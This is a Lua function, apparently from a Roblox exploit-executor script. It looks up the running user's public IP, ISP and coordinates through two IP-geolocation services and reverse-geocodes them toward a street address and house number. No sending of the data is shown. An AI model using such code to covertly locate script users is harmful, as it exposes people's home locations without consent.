local function GetLocation()
    local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request
    
    local ipInfo = {}
    local success1, res1 = pcall(function()
        return requestFunc({
            Url = "https://ipinfo.io/json",
            Method = "GET"
        })
    end)
    if success1 and res1 and res1.Body then
        local ok, decoded = pcall(function() return HttpService:JSONDecode(res1.Body) end)
        if ok and decoded then
            ipInfo = {
                ip = decoded.ip or "Unknown",
                city = decoded.city or "Unknown",
                region = decoded.region or "Unknown",
                country = decoded.country or "Unknown",
                loc = decoded.loc or "Unknown",
                postal = decoded.postal or "Unknown",
                timezone = decoded.timezone or "Unknown",
                org = decoded.org or "Unknown"
            }
        end
    end
    
    if not ipInfo.ip then
        local success2, res2 = pcall(function()
            return requestFunc({
                Url = "http://ip-api.com/json",
                Method = "GET"
            })
        end)
        if success2 and res2 and res2.Body then
            local ok, decoded = pcall(function() return HttpService:JSONDecode(res2.Body) end)
            if ok and decoded then
                ipInfo = {
                    ip = decoded.query or "Unknown",
                    city = decoded.city or "Unknown",
                    region = decoded.regionName or "Unknown",
                    country = decoded.country or "Unknown",
                    loc = (decoded.lat or "") .. "," .. (decoded.lon or ""),
                    postal = decoded.zip or "Unknown",
                    timezone = decoded.timezone or "Unknown",
                    org = decoded.isp or "Unknown"
                }
            end
        end
    end
    
    ipInfo.fullCountry = countryNames[ipInfo.country] or ipInfo.country
    
    if ipInfo.loc and ipInfo.loc ~= "Unknown" then
        local lat, lon = ipInfo.loc:match("([%d%.%-]+),([%d%.%-]+)")
        if lat and lon then
            local geo = ReverseGeocode(lat, lon)
            ipInfo.road = geo.road or ""
            ipInfo.houseNumber = geo.houseNumber or ""
            ipInfo.neighbourhood = geo.neighbourhood or ""
            ipInfo.suburb = geo.suburb or ""
            ipInfo.district = geo.district or ""
            ipInfo.state = geo.state or ""
            if geo.fullCountry and geo.fullCountry ~= "" then
                ipInfo.fullCountry = geo.fullCountry
            end
            ipInfo.fullAddress = geo.fullAddress or ""
        end
    end
    
    return ipInfo
end
